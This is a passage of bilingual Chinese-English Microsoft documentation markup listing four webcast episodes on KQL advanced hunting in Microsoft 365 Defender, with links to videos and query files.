|<span data-ttu-id="7d333-372">Title</span><span class="sxs-lookup"><span data-stu-id="7d333-372">Title</span></span>|<span data-ttu-id="7d333-373">说明</span><span class="sxs-lookup"><span data-stu-id="7d333-373">Description</span></span>|<span data-ttu-id="7d333-374">下载 MP4</span><span class="sxs-lookup"><span data-stu-id="7d333-374">Download MP4</span></span>|<span data-ttu-id="7d333-375">观看 YouTube</span><span class="sxs-lookup"><span data-stu-id="7d333-375">Watch on YouTube</span></span>|<span data-ttu-id="7d333-376">CSL 文件使用</span><span class="sxs-lookup"><span data-stu-id="7d333-376">CSL file to use</span></span>|
|---|---|---|---|---|
|<span data-ttu-id="7d333-377">第 1 节：KQL 基础知识</span><span class="sxs-lookup"><span data-stu-id="7d333-377">Episode 1: KQL fundamentals</span></span>|<span data-ttu-id="7d333-378">我们将介绍企业高级搜寻功能的基础知识Microsoft 365 Defender。</span><span class="sxs-lookup"><span data-stu-id="7d333-378">We'll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="7d333-379">了解可用的高级搜寻数据和基本 KQL 语法和运算符。</span><span class="sxs-lookup"><span data-stu-id="7d333-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span>|[<span data-ttu-id="7d333-380">MP4</span><span class="sxs-lookup"><span data-stu-id="7d333-380">MP4</span></span>](https://aka.ms/MTP15JUL20_MP4)|[<span data-ttu-id="7d333-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="7d333-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM)|[<span data-ttu-id="7d333-382">第 1 部分：Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="7d333-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|<span data-ttu-id="7d333-383">第 2 集：加入</span><span class="sxs-lookup"><span data-stu-id="7d333-383">Episode 2: Joins</span></span>|<span data-ttu-id="7d333-384">我们将继续了解高级搜寻数据以及如何将表联接在一起。</span><span class="sxs-lookup"><span data-stu-id="7d333-384">We'll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="7d333-385">了解内部、外部、唯一和半联接，以及默认 Kusto innerunique 联接的细微差别。</span><span class="sxs-lookup"><span data-stu-id="7d333-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span>|[<span data-ttu-id="7d333-386">MP4</span><span class="sxs-lookup"><span data-stu-id="7d333-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4)|[<span data-ttu-id="7d333-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="7d333-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU)|[<span data-ttu-id="7d333-388">第 2 部分：Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="7d333-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|<span data-ttu-id="7d333-389">第 3 部分：汇总、透视和可视化数据</span><span class="sxs-lookup"><span data-stu-id="7d333-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="7d333-390">既然我们可以筛选、操作和联接数据，现在可以开始汇总、量化、透视和可视化了。</span><span class="sxs-lookup"><span data-stu-id="7d333-390">Now that we're able to filter, manipulate, and join data, it's time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="7d333-391">在此剧集，我们将介绍汇总运算符和一些可在高级搜寻架构中深入其他表时执行的计算。</span><span class="sxs-lookup"><span data-stu-id="7d333-391">In this episode, we'll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="7d333-392">我们将数据集转换为可帮助改善分析的图表。</span><span class="sxs-lookup"><span data-stu-id="7d333-392">We turn our datasets into charts that can help improve analysis.</span></span>|[<span data-ttu-id="7d333-393">MP4</span><span class="sxs-lookup"><span data-stu-id="7d333-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4)|[<span data-ttu-id="7d333-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="7d333-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y)|[<span data-ttu-id="7d333-395">第 3 部分：Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="7d333-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|<span data-ttu-id="7d333-396">第 4 集：让我们搜寻！</span><span class="sxs-lookup"><span data-stu-id="7d333-396">Episode 4: Let's hunt!</span></span> <span data-ttu-id="7d333-397">将 KQL 应用于事件跟踪</span><span class="sxs-lookup"><span data-stu-id="7d333-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="7d333-398">跟踪某些攻击者活动的时间！</span><span class="sxs-lookup"><span data-stu-id="7d333-398">Time to track some attacker activity!</span></span> <span data-ttu-id="7d333-399">在此剧集中，我们将使用对 KQL 和 Microsoft 365 Defender高级搜寻的改进了解来跟踪攻击。</span><span class="sxs-lookup"><span data-stu-id="7d333-399">In this episode, we'll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="7d333-400">了解字段中用于跟踪攻击者活动的一些提示和技巧，包括网络安全的 APC 以及如何将它们应用到事件响应。</span><span class="sxs-lookup"><span data-stu-id="7d333-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span>|[<span data-ttu-id="7d333-401">MP4</span><span class="sxs-lookup"><span data-stu-id="7d333-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4)|[<span data-ttu-id="7d333-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="7d333-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8)|[<span data-ttu-id="7d333-403">第 4 部分：Git 中的 CSL 文件</span><span class="sxs-lookup"><span data-stu-id="7d333-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a><span data-ttu-id="7d333-404">下一步</span><span class="sxs-lookup"><span data-stu-id="7d333-404">Next step</span></span>

|<span data-ttu-id="7d333-405">![结束和摘要阶段](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="7d333-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="7d333-406">结束和摘要阶段</span><span class="sxs-lookup"><span data-stu-id="7d333-406">Closing and summary phase</span></span>](m365d-pilot-close.md)|<span data-ttu-id="7d333-407">分析你的Microsoft 365 Defender结果，将其展示给利益干系人，然后执行下一步。</span><span class="sxs-lookup"><span data-stu-id="7d333-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|
